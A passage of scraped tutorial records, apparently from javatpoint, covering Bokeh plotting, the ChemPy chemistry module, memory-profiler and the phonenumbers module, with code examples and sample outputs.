3, 4]]]]', '# creating a new plot', 'fig1 = figs(title = ""Plot 1"", plot_width = 250,', 'plot_height = 250)', 'fig1.line(x, y, line_width = 25, color = ""Orange"")', '# creating second plot', 'fig2 = figs(title = ""Plot 2"", plot_width = 250,', 'plot_height = 250)', 'fig2.circle(x, y, size = 25, color = ""Blue"")', '# creating third plot', 'fig3 = figs(title = ""Plot 3"", plot_width = 250,', 'plot_height = 250)', 'fig3.square(x, y, size = 25, color = ""Green"")', '# create forth plot', 'fig4 = figs(title = ""Plot 4"", plot_width = 250,', 'plot_height = 250)', 'fig4.triangle(x, y, size = 25, color = ""RED"")', '# creating fifth plot', 'fig5 = figs(title = ""Plot 5"", plot_width = 250,', 'plot_height = 250)', 'fig5.multi_polygons(xs, ys, color = ""Blue"")', '# creating sixth plot', 'fig6 = figs(title = ""Plot 6"", plot_width = 250,', 'plot_height = 250)', 'fig6.line(x, y, line_dash = ""dotted"", color = ""Green"")', '# depict visualization', 'show(row(fig1, fig2,', 'fig3, fig4,', 'fig5, fig6))']",[],[],['|||Step 1: We will import all the required libraries and modules|||Step 2: We will assign coordinates and then start depicting the plots using the figure class.|||Step 3: we will then use the figure object as an argument in the row() function.|||Step 4: we will at last use the show function for depicting the visualized return output from the row() function.|||']
407,['How to Make an Area Plot in Python using Bokeh'],"['Bokeh is an Interactive Data visualization library of Python. It creates its plots by using HTML and JavaScript languages. Its basic targets are modern website browsers for presenting provided elegance, concise construction of novel graphics with high-performance interactivity.']","['https://www.javatpoint.com/python-chempy-module', 'https://www.javatpoint.com/how-to-plot-multiple-plots-using-bokeh-in-python', 'https://www.javatpoint.com/python-chempy-module', 'https://www.javatpoint.com/how-to-plot-multiple-plots-using-bokeh-in-python', 'https://www.javatpoint.com/python-chempy-module']","['https://static.javatpoint.com/python/images/how-to-make-an-area-plot-in-python-using-bokeh.png', 'https://static.javatpoint.com/python/images/how-to-make-an-area-plot-in-python-using-bokeh2.png']",[],"['Plotting the Area Plots', 'Conclusion']","['1. varea() Function:', '2. harea() Function:']",[],"['In this tutorial, we will learn how to create an area plot on a graph using the bokeh library.', 'Area Plots can be defined as the filled regions between two series that share a common area. The Bokeh figure class has two functions, namely:', 'Syntax for varea() function is:', 'Parameter:', 'The varea() function accepts the following parameters:', 'Syntax for harea() function is:', 'Parameter:', 'The harea() function accepts the following parameters:']","['The varea() function is used for vertically directed areas. It has one ""X"" coordinate array and two ""Y"" coordinate arrays, ""Y1"" and ""Y2"", which would be filled between.', 'The harea() function of the Bokeh library is used for horizontally directed areas on a Graph. It has one ""Y"" coordinate array and two ""X"" coordinate arrays, ""X1"" and ""X2"", which would be filled between.', 'In this tutorial, we discussed how we could create area plots in vertical and horizontal directions using the varea() and harea() function of the bokeh library in Python.']",[],"['varea(x, y1, y2, **kwargs)', '# First, we will import all the required libraries', 'import numpy as nmp', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', 'x_1 = [2, 5, 1, 7, 3, 4, 6]', 'Y_1 = [1, 7, 6, 2, 3, 4, 5]', 'Y_2 = [3, 2, 1, 7, 5, 6, 4]', '# here, we will create an Output file for saving the Output', 'OF(""JavaTpoint.html"")', '# Now, we will instantiate the figure object', 'PLOT1 = fig(plot_width = 400, plot_height = 400, title = ""Area Plot on Graph using Bokeh\'s varea() Function"")', '# Creating the area plot', 'PLOT1.varea(x = x_1, y1 = Y_1, y2 = Y_2, fill_color = ""BLUE"")', '# Displaying the Plot', 'show(PLOT1)', 'harea(x1, x2, y, **kwargs)', '# First, we will import all the required libraries', 'import numpy as nmp', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', 'x_1 = [2, 5, 1, 7, 3, 4, 6]', 'x_2 = [1, 7, 6, 2, 3, 4, 5]', 'Y_1 = [3, 2, 1, 7, 5, 6, 4]', '# here, we will create an Output file for saving the Output', 'OF(""JavaTpoint.html"")', '# Now, we will instantiate the figure object', 'PLOT1 = fig(plot_width = 400, plot_height = 400, title = ""Area Plot on Graph using Bokeh\'s harea() Function"")', '# Creating the area plot', 'PLOT1.harea(x1 = x_1, x2 = x_2, y = Y_1, fill_color = ""BLUE"")', '# Displaying the Plot', 'show(PLOT1)']",[],[],"['|||varea()|||harea()||||||x: It is the ""x-coordinates"" for the points of the area plot.|||y1: It is the ""y-coordinates"" for the points of one side of the area plot.|||y2: It is the ""y-coordinates"" for the points of the other side of the area plot.||||||x1: It is the ""x-coordinates"" for the points of one side of the area plot.|||x2: It is the ""x-coordinates"" for the points of the other side of the area plot.|||y: It is the ""y-coordinates"" for the points of the area plot.|||']"
408,['Python ChemPy Module'],"[""While learning Python and its basics, we all must have heard that Python is one of the most popular programming languages, and the demand for Python in the market is increasing with every passing day. It is also not very hard to depict the reasons behind it, but as most of us read that Python is easy to learn and understand, and that's why it is so much popular. It is true up to some extent but not completely true because there are other major reasons which are reasons behind the increasing popularity and demand of Python. The most important reason is that Python has a very rich library in which it has lots of packages that are very useful in multiple fields like ML (Machine learning), Robotic Development, AI (Artificial Intelligence), Data Science, Data Analysis, etc. Other than this, Python offers multiple solution packages for multiple subjects like the Physics module, ChemPy module, Statistics module, etc. One of such important solution packages offered by Python is the ChemPy module designed to solve inorganic and physical chemistry problems. We are going to learn about this ChemPy module of Python in this tutorial, and we will learn about its applications, implementation, and installation.""]","['https://www.javatpoint.com/python-memory-profiler-module', 'https://www.javatpoint.com/how-to-make-an-area-plot-in-python-using-bokeh', 'https://www.javatpoint.com/python-memory-profiler-module', 'https://www.javatpoint.com/how-to-make-an-area-plot-in-python-using-bokeh', 'https://www.javatpoint.com/python-memory-profiler-module']",['https://static.javatpoint.com/python/images/python-chempy-module.png'],[],['Introduction to ChemPy Module of Python'],"['ChemPy Module in Python: Applications', 'ChemPy Module in Python: Installation', 'ChemPy Module in Python: Implementation', ""Application 1: Getting 'N' number of elements from the periodic table:"", 'Application 2: Getting properties and formula of a given chemical substance:']",[],"['Following are some general applications of the ChemPy module by using them in a Python program:', 'Example 1:', 'Look at the following program where we have printed elements from periodic table in the output:', 'As we can see, a list of the required number of elements with their atomic masses and symbols is printed in the output.', 'Explanation:', 'Example 2:', 'Look at the following Python program where we used substance functions of chempy on ferricyanide:', 'As we can see, we have printed multiple properties of the ferricyanide in the output using substance functions of the chempy module.', 'Explanation:']","[""These are some general applications of the Python ChemPy Module, and it has many other applications too. We can implement all of chempy's applications through a Python program by importing this module into the program."", 'As we can see, the chempy module is successfully installed in our system, and now we can start working with it to understand its implementation and applications.', 'We will use a Python program in each application listed above and print the required result in the output to understand the implementation of the chempy module.']","['ChemPy module is a Python package that is mainly designed to solve problems of inorganic, physical, and analytical chemistry. ChemPy module is an open-source and free Python package, and it has applications in fields like materials science, chemical engineering, chemistry, etc. ChemPy module is basically designed to solve all problems related to chemistry and associated fields of chemistry with the help of a Python program.', 'This package includes many classes which are used to represent different types of reactions, the system of reactions, and substances. ChemPy module also includes analytical solutions to some differential equations that are commonly encountered in chemical kinetics, and it also has all the well-established formulae of Physical and analytical chemistry that help us in finding many important values.', ""ChemPy module has multiple applications in various fields and associated fields of chemistry like materials science, etc. ChemPy module offers us a wide range of classes and functions which are very useful in calculating important values like Ionic strength, Chemical equilibrium, and many more. Classes of this module also represent reactions, systematic reactions, substances, and thus we can carry them out through a Python program. Besides these applications, the chempy module has multiple other applications related to chemistry and its associated fields' problems which we will discuss in this section."", 'ChemPy is not an in-built module of Python, and therefore first, we have to install this module in our system before importing it into a Python program. We should make sure that the chempy module is present and successfully installed in our system before we start working with it. If the chempy module is not present in our system, there are multiple ways and methods which we can use to install the chempy module, but in this tutorial, we will install the chempy module through the pip installer. We will use the pip command to install the chempy module through the command prompt terminal of our system using the pip installer. Following pip command, which we will use to install the chempy module through pip installer:', 'Once we write the above-given command inside the terminal, we have to press the enter key to give the pip installer command to start the installation process. Once the installation process starts, it will take a while to install this module in our system successfully, and therefore, we have to wait for a while.', ""Now, moving ahead with the implementation of the chempy module, we can use its applications and functions to perform many chemical analyses and solve many chemistry problems through a Python program. But we will only use the following two applications of the chempy module in this tutorial and understand this module's implementation:"", ""We can get a required number of elements with their properties, such as atomic mass, symbol, etc., in the output using the period table functions from the chempy module in the program. We will understand the implementation and use of this application through the following example program, where we will print the 'n' number of elements with their properties in the output."", ""We have first imported periodic function as 'prd' from the chempy module in the program. After that, we initialized the 'num' variable where we take the user input the value, and then we will print the 'num' number of elements. After that, we used the for loop to loop over the periodic function to print the required number of functions in the output. We used the names[a] function to print the element names, symbols[a] to print the symbol of elements, and relative_atomic_masses[a] to print their atomic passes. We used the for loop till 'num' number of times, and then the list is printed in the output."", 'We can print the chemical and general properties of a substance, like its formula, html name, etc., by using the substance functions of the chempy module. With substance functions, we can also validate the formula of a given substance with the existing formula. We will understand the implementation and use of this application through the following example program:', ""We have imported substance as sst from the chempy module in the program. After that, we initialized the variable for ferricyanide by taking the formula of ferricyanide from the library. Then, we used the if statement to validate if the given variable's formula is actually the ferricyanide's chemical formula or not. After that, we printed Unicode, latex, and html names of the substance according to the chempy library, and lastly, we printed the mass of the substance in the output.""]","['pip install chempy', '# Importing the chempy module', 'from chempy.util import periodic as prd', '# Number of elements from user', 'num = int(input(""Enter number of elements which you want to fetch from periodic table: ""))', 'print(""Printing"", num, ""elements from the periodic table"")', '# Displaying the periodic element information', 'print(""Atomic No.\\tName\\t\\tSymbol\\t\\tMass"")', '# Using for loop to loop over periodic table', 'for a in range(1, num + 1):', '# Printing the atomic number of elements', 'print(a, end = ""\\t\\t"")', '# Displaying the names of elements', 'if len(prd.names[a]) > 7:', 'print(prd.names[a], end = ""\\t"")', 'print(prd.names[a], end = ""\\t\\t"")', '# Printing the element symbol', 'print(prd.symbols[a], end = ""\\t\\t"")', '# Displaying the atomic mass of element', 'print(prd.relative_atomic_masses[a])', 'print(""Result for periodic elements is printed according to number you provided"")', '# Import the chempy module', 'from chempy import Substance as sst', '# Defining chemical formula for Ferricyanide', ""elemtentFerriCyanide = sst.from_formula('Fe(CN)6-3')"", '# Checking if the chemical formula provided is right', 'if elemtentFerriCyanide.composition == {0: -3, 26: 1, 6: 6, 7: 6}:', 'print(""Yes formula for Ferricyanide given in the program is right"")', '# Printing chemical formula for Ferricyanide', 'print(""Chemical formula for Ferricyanide:"", elemtentFerriCyanide.unicode_name)', '# Printing chemical formula for Ferricyanide in latex form', 'print(""Chemical formula for Ferricyanide in latex name form:"", elemtentFerriCyanide.latex_name)', '# Printing chemical formula for Ferricyanide in html form', 'print(""Chemical formula for Ferricyanide in html name form:"", elemtentFerriCyanide.html_name)', '# Printing total mass of Ferricyanide', 'print(""Atomic mass of Ferricyanide compound:"", \'%.3f\' % elemtentFerriCyanide.mass)']","['Enter number of elements which you want to fetch from periodic table: 24', 'Printing 24 elements from the periodic table', 'Atomic No.\tName\t\tSymbol\t\tMass', '1\t\tHelium\t\tHe\t\t4.002602', '2\t\tLithium\t\tLi\t\t6.94', '3\t\tBeryllium\tBe\t\t9.0121831', '4\t\tBoron\t\tB\t\t10.81', '5\t\tCarbon\t\tC\t\t12.011', '6\t\tNitrogen\tN\t\t14.007', '7\t\tOxygen\t\tO\t\t15.999', '8\t\tFluorine\tF\t\t18.998403163', '9\t\tNeon\t\tNe\t\t20.1797', '10\t\tSodium\t\tNa\t\t22.98976928', '11\t\tMagnesium\tMg\t\t24.305', '12\t\tAluminium\tAl\t\t26.9815385', '13\t\tSilicon\t\tSi\t\t28.085', '14\t\tPhosphorus\tP\t\t30.973761998', '15\t\tSulphur\t\tS\t\t32.06', '16\t\tChlorine\tCl\t\t35.45', '17\t\tArgon\t\tAr\t\t39.948', '18\t\tPotassium\tK\t\t39.0983', '19\t\tCalcium\t\tCa\t\t40.078', '20\t\tScandium\tSc\t\t44.955908', '21\t\tTitanium\tTi\t\t47.867', '22\t\tVanadium\tV\t\t50.9415', '23\t\tChromium\tCr\t\t51.9961', '24\t\tManganese\tMn\t\t54.938044', 'Result for periodic elements is printed according to the number you provided', 'Yes formula for Ferricyanide given in the program is right', 'Chemical formula for Ferricyanide: Fe(CN)₆³?', 'Chemical formula for Ferricyanide in latex name form: Fe(CN)_{6}^{3-}', 'Chemical formula for Ferricyanide in html name form: Fe(CN)<sub>6</sub><sup>3-</sup>', 'Atomic mass of Ferricyanide compound: 211.955']",[],"[""|||We can use the chempy module for balancing chemical reactions through a Python program|||We can use multiple formulae from the chempy module to calculate multiple chemical and analytical values such as morality, molality, and many more|||We can use functions of this module to maintain chemical equilibria for chemical reactions|||We can use the chempy module's classes to identify the substance and maintain reaction systematics in the program|||We can use also use functions of the chempy module to find out the ionic strength of the ions or molecules by applying the formula|||ChemPy module also provide us with functions that can be used as parsing formulae|||We can use the chempy module to print elements from the periodic table with their properties like atomic mass, charge, and many more|||We can also calculate chemical kinetics such as order of reactions from a given chemical reaction using functions of chempy module in a Python program|||&&&|||Getting 'N' number of elements from the periodic table|||Getting properties and formula of a given chemical substance|||""]"
409,['Python memory-profiler Module'],"[""We all may have heard about slow processing or slow execution of an application, but ever we have tried to understand the reason behind it? There is a possible reason for the time application is taking to process or execute our commands, but what about RAM usage? RAM or memory of the system is very much essential for the processing and execution time of an application, but nobody actually talks about it. How much memory (RAM) is used while executing or processing the command also affects the application's execution speed. This may sound ridiculous or insignificant to us, but it plays a very important role in the performance of our system and the applications installed in it. Therefore, it is quite common that applications that have less RAM will take high time to execute compared to applications that have more RAM.""]","['https://www.javatpoint.com/python-phonenumbers-module', 'https://www.javatpoint.com/python-chempy-module', 'https://www.javatpoint.com/python-phonenumbers-module', 'https://www.javatpoint.com/python-chempy-module', 'https://www.javatpoint.com/python-phonenumbers-module']","['https://static.javatpoint.com/python/images/python-memory-profiler-module.png', 'https://static.javatpoint.com/python/images/python-memory-profiler-module2.png']",[],['Introduction to memory-profiler Module of Python'],"['memory-profiler Module of Python: Advantages & Features', 'memory-profiler Module of Python: Installation', 'The memory-profiler Module of Python: Implementation', 'Implementation 1: Analysing memory usage from a default function:', 'Implementation 2: Analysing memory usage during an execution process:']","['Note: In the implementation part of this tutorial, we will use the request module with the memory-profiler module in one of the example programs to understand the real-life implementation and usage of memory tracking and analysis through the memory-profiler module. Therefore, before we move forward with the implementation part, we should make sure that the request module is present in our system, and if it is not present in our system, we can install it from the pip installer using the following pip command in the terminal:']","['These are some advantages of using the memory-profiler module, and it also helps us improve the performance of Python.', ""As we can see, the requests module is already present in our system, and that's why a requirement already satisfied message is displayed to us."", 'Example 1:', 'As we can see, memory usage for every line of the program is displayed with the confirmation statement in the last.', 'Explanation:', 'In the output of the above example, we can see multiple columns which represent multiple properties that are defined below:', 'Example 2:', 'Now, we are done with the program writing part, and when we run the second file, we will see the following output:']","['As we can see, the memory-profiler is successfully installed in our system, and now we can move further with the implementation of it, and we can now even use this module for development purposes.', ""So, that's how we can understand the analysis of the memory usage by a Python program and even by the particular line in the program so that we will know how this function or line of code is affecting the performance and execution time."", ""After writing the program given above, we will save the file with the 'memoryexample' name, and now we will create another file where we will import this file and write the following Python program in it:""]","[""This same thing is applicable while executing a program, and that's why it is very important to see how much memory is used while executing a program. This will help us manage the memory usage or design the program in a better way and keep memory usage in mind. But now, some questions will come to our mind, such as how we can do this, track a program's memory usage, or find out which functions of the program use more memory and make its execution slow? We have a memory profiling module in Python, which helps us track the memory usage by a program and its functions. We are going to learn about the Python memory-profiler module in this tutorial, and we will learn how we can use this module to track the RAM used with distribution while executing a program."", 'memory-profiler is an open-source Python module that offers us the functions to track memory consumption of a program while its execution, and we can even monitor memory consumption with line-by-line analysis in the program and functions of the program. the memory-profiler module also helps us analyze the performance of the Python and how much the performance & execution speed is affected by the RAM consumption during its execution. Here, we will discuss the installation and implementation of the memory-profiler module with the help of example programs, but first, we will learn about what are the advantages and features of this module.', ""Most of us may have seen many people complaining that Python is a slow programming language compared to others, and it takes more time to execute a program or application. Well, if we have asked them what approach they are using to calculate the speed of execution, the first answer we will receive is the total time spent by Python to execute the code or part of a code or something like this. But we will see that none of them will talk about usage or how much RAM is used while executing that particular part of the code. It may seem like very insignificant information regarding the program's execution speed, but actually, it is very important, which affects the speed of Python for executing a program. Therefore, it is equally important to analyze the memory usage during the execution of a program which becomes possible because of the memory-profiler module of Python. Python memory-profiler module has the following features and advantages regarding monitoring and analyzing memory usage by a program during the execution:"", ""memory-profiler Module of Python is not an in-built module, and that's why if we want to understand its implementation and use it in the development process, we have to install this module in our system or make sure that this module is properly installed in our system. If the memory-profiler is not present in our system, we can install it through various methods, but the simplest way which we can choose is installing it through the pip installer. Therefore, in this installation part, we are going to install the memory-profiler module through the pip installer by using the following command:"", ""First, we have to write the command given above in the command prompt terminal shell, and after that, we have to press the 'enter' key to start the installation process. Once the installation process starts, it will take some time, and we have to wait until it is successfully installed in our system."", ""We will use here two examples to understand the implementation of the memory-profiler module, and we will analyze the memory usage in the program when the result is displayed in the output. Let's have a look at the following two example programs to understand the implementation of the memory-profiler module:"", ""In this implementation part, we will create a default function in the example program and define some variables in it, and after that, we will perform some operations on these variables. We will then analyze the memory usage by each line of the program when the result is displayed in the output. Let's look at the following example program to understand this implementation part of the memory-profiler module."", ""We have first imported the profile decorator class from the memory-profiler module in the program. After that, we used the profile decorator, and then we defined a default function with the name 'defFunc.' Inside this default function, we have defined three variables, and after that, then we deleted the first & third variables and returned the second variable from the function. Then, we called the default function, and after that, we have used a print statement like the confirmation message."", 'This implementation part will cover the practical implementation of the memory-profiler module for monitoring and analyzing the memory usage of a Python program. In this implementation part, first, we will create a Python file with the following example program in it:', ""We can see total memory usage during the execution process, and the extraction process of words from the file and URL is displayed in the output. That's how we can analyze and understand a program's memory usage and how it is affecting the performance and execution speed of the program.""]","['pip install memory-profiler', 'pip install requests', '# Importing memory-profiler module in the program', 'from memory_profiler import profile', '# Profile Decorator class', '@profile', '# A default function to check memory usage', 'def defFunc():', '# Some random variables', 'var1 = [1] * (6 ** 4)', 'var2 = [1] * (2 ** 3)', 'var3 = [2] * (4 * 6 ** 3)', '# Operations on variable', 'del var3', 'del var1', 'return var2', ""if __name__ == '__main__':"", '# Calling default function', 'defFunc()', '# Print confirmation message', 'print(""We have successfully inspected memory usage from the default function!"")', '# Import memory_profiler module', 'from memory_profiler import profile', '# Importing request module in the program', 'import requests', '# Creating a base extractor class', 'class baseExtr:', '# Using profile decorator for monitoring memory usage', '@profile', '# Default function for parsing words from list', 'def parseList(self, array):', '# Creating a file type object in the system', ""sampleFile = open('wordParsing.txt', 'w')"", '# Looping over the file with for loop', 'for parsedWords in array:', '# Writing words in the example file', 'sampleFile.writelines(parsedWords)', '@profile', '# Another default function for fetching URL', 'def parseURL(self, url):', '# Fetching response from the file', 'response = requests.get(url).text', ""with open('url.txt', 'w') as sampleFile:"", '# Writing fetched responses in the example file', 'sampleFile.writelines(response)', '# Import baseExtr class from memoryexample file', 'from memoryexample import baseExtr', 'if __name__ == ""__main__"":', '# Git URL for importing word list', ""url = 'https://raw.githubusercontent.com/dwyl/english-words/master/words.txt'"", '# Array for word from text file', ""array = ['five', 'four', 'three', 'two', 'one']"", '# Initializing Extractor object from baseExtr() class', 'wordExtract = baseExtr()', '# Calling parseURL() function from baseExtr class', 'wordExtract.parseURL(url)', '# Calling out pasreList() function', 'wordExtract.parseList(array)']","['Filename: C:\\Users\\Manish\\memoryexample.py', 'Line #    Mem usage    Increment    Occurences    Line Contents', '============================================================', '4      40.2 MiB      40.2 MiB     1            @profile', '5                                              # a default function to check memory usage', '6                                                  def defFunc():', '7                                              # Some random variables', '8      40.2 MiB      0.0 MiB      1            var1 = [1] * (6 ** 4)', '9      40.2 MiB      0.0 MiB      1            var2 = [1] * (2 ** 3)', '10     40.2 MiB      0.0 MiB      1            var3 = [2] * (4 * 6 ** 3)', '11                                             # Operations on variable', '12     40.2 MiB      0.0 MiB      1            del var3', '13     40.2 MiB      0.0 MiB      1            del var1', '14     40.2 MiB      0.0 MiB      1            return var2', 'We have successfully inspected memory usage from the default functi', 'Filename: C:\\Users\\Manish\\memoryexample.py', 'Line #    Mem usage    Increment    Occurences    Line Contents', '============================================================', '17     44.6 MiB     44.6 MiB           1   \t@profile', '18                                            def parseURL(self, url):', '19                                            # fetches the response', '20     51.9 MiB      7.3 MiB           1   \tresponse = requests.get(url).text', ""21     51.9 MiB      0.0 MiB           1   \twith open('url.txt', 'w') as sampleFile:"", '22', '23                                            # writing response to file', '24     52.5 MiB      0.6 MiB           1   \tsampleFile.writelines(response)', 'Filename: C:\\Users\\Manish\\memoryexample.py', 'Line #    Mem usage    Increment    Occurences    Line Contents', '============================================================', '8      47.9 MiB      47.9 MiB       1   \t     @profile', '9                                            # Default function for parsing words from list', '10                                         \t def parseList(self, array):', '11                                           # Creating a file type object', ""12     47.9 MiB      0.0 MiB       1   \t     sampleFile = open('wordParsing.txt', 'w')"", '13                                           # looping over the file', '14     47.9 MiB      0.0 MiB       6   \t     for parsedWords in array:', '15                                           # Writing words in the example file', '16     47.9 MiB      0.0 MiB       5   \t     sampleFile.writelines(parsedWords)', '[Finished in 27.1s]']",[],"['|||This module helps us in tracking the memory usage by a Python program during execution so that we can know the reason behind performance and speed|||We can even track the memory usage of a particular part of a program with the help of the memory-profiler module|||We can even monitor line-by-line consumption of memory by the program while it is executed|||&&&|||Line #: This column represents the line number of the program whose memory usage is displayed|||Mem Usage: This column represents the memory or RAM used till the particular line of code during the entire execution process|||Increment: This column displays the difference seen in the memory usage in the current line compared to the previous line of code, or we can see it basically displays|||Occurences: This line displays the number of times code of line against this particular line number is executed|||Line Contents: It represents the Python code written in that particular line|||']"
410,['Python Phonenumbers Module'],"[""Whenever we look at strange phone numbers or a call from a random number comes, some basic questions come to our mind, including who is calling, from where the person is calling, region of the phone number, phone number is valid or not, and many others. If we have to find out the answer to all these questions manually, it will take some time as we can't perform all the operations at once. Like, for knowing the region of the phone number, we must have an idea of the country code of every country, which is practically not possible (except for some exceptions). Same, if we have to check that given phone number manually is valid or not, then we have to dial the number, and what if we have hundreds or thousands of such numbers. Therefore, manually performing such operations is very hectic and time-consuming, and that's why we have to look for alternate solutions. Many programming languages offer us extensions or packages to perform these operations on given phone numbers.""]","['https://www.javatpoint.com/python-platform-module', 'https://www.javatpoint.com/python-memory-profiler-module', 'https://www.javatpoint.com/python-platform-module', 'https://www.javatpoint.com/python-memory-profiler-module', 'https://www.javatpoint.com/python-platform-module']",['https://static.javatpoint.com/python/images/python-phonenumbers-module.png'],[],['Introduction to Phonenumbers Module of Python'],"['Phonenumbers Module of Python: Installation', 'Phonenumbers Module of Python: Implementation', 'Application 1: Knowing the Region of the Phone Number', 'Application 2: Finding Operator of the Given Phone Number:', 'Application 3: Parsing a Given Phone Number:', ""Application 4: Getting Timezone of the Given Phone Number's Region:"", 'Application 5: Matching and Extracting Phone Numbers:', 'Application 6: Validating a Phone Number:']",['Note: We have to keep in mind that the given phone number as an argument in the parse() function should be given with the country code of it.'],"['Example 1: Look at the following program where we have printed the region of a given phone number in the output:', 'Explanation:', 'Example 2: Look at the following Python program where we have printed the sim card operator of given phone number:', 'Explanation:', 'Example 3: Look at the following program where we have used the parse() function to parse a phone number:', 'Example 4: Look at the following Python program where we have printed the timezone of a given phone number in the output:', 'Example 5: Look at the following Python program where we have performed extracting and matching operations on given phone numbers:', 'Explanation:', 'Example 6: Look at the following program where we have validated and checked the possibility of a given number:']","['We will perform all the operations given above in this part by using functions of the phonenumbers module in an example program to understand its implementation and working.', ""As we can see, the carrier of the given phone number is printed in the output, and that's how we can find out and print the SIM card operator of any given phone number."", 'As we can see, we have parsed the given phone number in the program, and we can use this parse function to parse any phone number given in the argument.', ""As we can see, the timezone of the given phone number is printed in the output, and that's how we can find out and print the timezone of any given phone number."", ""As we can see, the validation and possibility of the given number are printed in the output, and that's how we can validate and check the possibility of any given phone number.""]","['Python, one of the most popular programming languages, offers us the phonenumbers Module, which is very helpful to us to perform all such operations using a program. Therefore, we will learn this phonenumbers Module of Python in this tutorial and perform several such operations by using this module in example programs.', 'Phonenumbers is a Python module that comes with multiple features such as parsing phone numbers, etc. The Phonenumbers module of Python has multiple functions capable of performing various operations on a given phone number, like finding the region of the phone number, operator of the phone number, etc. We can use functions of the phonenumbers module in a Python program by importing this module into the program, and then we can use these functions to perform desired operations on given phone numbers. The Phonenumbers module is very helpful for us in many ways, which include several following benefits:', ""These are the several highlighted advantages of using the phonenumbers module in a Python program. We will perform several such operations on a given phone number in this tutorial through example programs, and that's how we will understand the implementation of the phonenumbers module. We will also perform the installation process of the phonenumbers module in this section."", ""Phonenumbers is not an in-built package of Python (it doesn't get installed along with the Python installation), and that's why if this module is not present in our system already, we have to install this module. We should first make sure that the phonenumbers module is already installed in the system or not because we will not be able to perform implementation without having this module present in our system. If the phonenumbers module is not installed in our system, we have multiple methods to install this module and among all the possible installation methods, installing the phonenumbers module with the pip installer is the simplest and easiest one. That's why we will use pip installer in this tutorial for installing the phonenumbers module in our system, and in this method, we will use the following pip installer command:"", 'We have to write the above-given command in the command prompt terminal shell, and after writing the command, we have to press the enter key so that the pip installer will start installing this module in our system. Once the installation process of this module begins, it will take a while to install the module in our system successfully, and we have to wait till then.', 'As we can see, a successfully installed message is displayed on our screen, which means that the phonenumbers module is now successfully installed in our system. Now, we can start working with the phonenumbers module by importing it into the example Python programs and understanding its implementation.', ""As we have already discussed, we can perform several operations using the functions of the phonenumbers module in a Python program. We will perform several such operations with the phonenumbers module's functions in this part to understand the implementation of this module. We are going to perform the following operations with the functions of the phonenumbers module to understand its implementation:"", 'We can know the region of a given phone number, i.e., we can find out from which country or which area, given phone number belong. The Geocoder library of the phonenumbers module provides us the description_for_number() function, which we can use to find out the region of a given phone number. We can use this by giving the phone number as an argument inside the function, and then we can print the region of the phone number as a result in the output. We can understand the implementation of the description_for_number() function of the phonenumbers module through the following example program.', ""As we can see, the region of the given phone number is printed in the output, and that's how we can find out and print the region of any given phone number. We have hidden the last six digits of the phone number used in the example for security and personal reasons."", ""After importing the phonenumbers module as pt, we have imported the geocoder library of the phonenumbers module as gc. After that, we have parsed the given phone number and stored the result in the initialized variable (givenPN) to use it as an argument inside the description_for_number() function. Then, we used the parsed number variable in the description_for_number() as an argument and stored the result in the second initialized variable. Inside the description_for_number() function, we have also used the 'en' language to specify English for printing and storing results. Lastly, we printed the result in the output by using the regionOfPN variable in the print statement."", 'We can even find out that the given phone number belongs to which SIM card operator using the phonenumbers module. The carrier library of the phonenumbers module provides us the option to find out the carrier of the phone number using the name_for_number() function. In the name_for_number() function of the carrier library, we have to use the parse phone number as an argument, and then we can print the carrier of the given phone number in the output. We can understand the implementation of the name_for_number() function of the phonenumbers module through the following example program.', 'We have used the parsed phone number variable inside the name_for_number() function to find out the carrier, and lastly, we printed the result of the program in the output by using the result variable, i.e., carrierOfPN variable, in the print statement.', 'Parsing a given phone number means setting the given phone number according to the phonenumbers module format. We can do this operation using the parse() function of the phonenumbers module by providing a phone number as an argument in the function. The function will yield the result by providing the given phone number in the phonenumbers format in the output. We can understand the use of this parse() function through the following example program where we parse a given phone number.', ""We can even get the timezone of the area from where the given phone number belongs simply from the given phone number. We can perform this task using the phonenumbers module as the phonenumber module provide us with the timezone library, which is used to find out the timezone of the given phone number's area. The timezone library of the phonenumbers module provides us with the time_zones_for_number() function, which we can use to find out the timezone of the phonenumber. We have to simply give the parsed phone number as an argument in the time_zones_for_number(), and thus, we can find out the timezone of the phone number and print the result in the output. We can understand the implementation of the time_zones_for_number() function of the phonenumbers module through the following example program."", 'Sometimes we have given multiple phone numbers, and we have to find out phone numbers of a particular country code or region among them. If we do this manually, it will take a lot of time but doing it with the help of the phonenumbers module saves a lot of time. The Phonenumbers module provides us with the PhoneNumberMatcher object, which has a relevant function to perform phone number matching tasks. We can use PhoneNumberMatcher() function with some given phone numbers to filter out required phone numbers, and then we can print them in the output. We can understand this implementation of the phonenumbers module with the help of the following example program:', ""As we can see, we have extracted a particular region (India in this example) phone number from the given sample text and printed it in the output. That's how we can use the PhoneNumberMatcher object to match and extract some particular phone number from given text."", 'After defining a sample text (in which we have mentioned two different regions phone numbers), we have used this sampleText variable in the PhoneNumberMatcher() function with the ""IN"" argument so that it will find out Indian regions phone numbers from the sample text. After that, we have printed the result of this search in the output using the for loop to loop over the resultPN variable.', 'We can even check that if a given phone number is valid or not using the phonenumbers module. Other than this, we can also check that if the given number is possible or not. For performing both these tasks, phonenumbers provide us with two different functions i.e., is_valid_number() & is_possible_number(). We can use these functions to determine the validation and possibility of a given phone number by providing parsed phone number as an argument in these functions. We can understand the implementation of both of these functions through the following example program.']","['pip install phonenumbers', '# Importing phonenumbers module', 'import phonenumbers as pn', '# Importing geocoder library from the phonenumbers module', 'from phonenumbers import geocoder as gc', '# Parsing a given phone number', 'givenPN = pn.parse(""+919034xxxxxx"")', '# Using parse phone number for finding region', ""regionOfPN = gc.description_for_number(givenPN, 'en')"", '# Printing region as the result', 'print(""The region of the given phone number is: "", regionOfPN)', '# Importing phonenumbers module', 'import phonenumbers as pn', '# Importing carrier library from the phonenumbers module', 'from phonenumbers import carrier as cr', '# Parsing a given phone number', 'givenPN = pn.parse(""+919034xxxxxx"")', '# Using parse phone number for finding the carrier', ""carrierOfPN = cr.name_for_number(givenPN, 'en')"", '# Printing carrier as the result', 'print(""The SIM Card operator or carrier of the given phone number is: "", carrierOfPN)', '# Importing phonenumbers module', 'import phonenumbers as pn', '# Parsing a given phone number', 'givenPN = pn.parse(""+919034xxxxxx"")', '# Printing the parsed phone number', 'print(""The given phone number after parsed will look like as the following format: "")', 'print(givenPN)', '# Importing phonenumbers module', 'import phonenumbers as pn', '# Importing timezone library from the phonenumbers module', 'from phonenumbers import timezone as tz', '# Parsing a given phone number', 'givenPN = 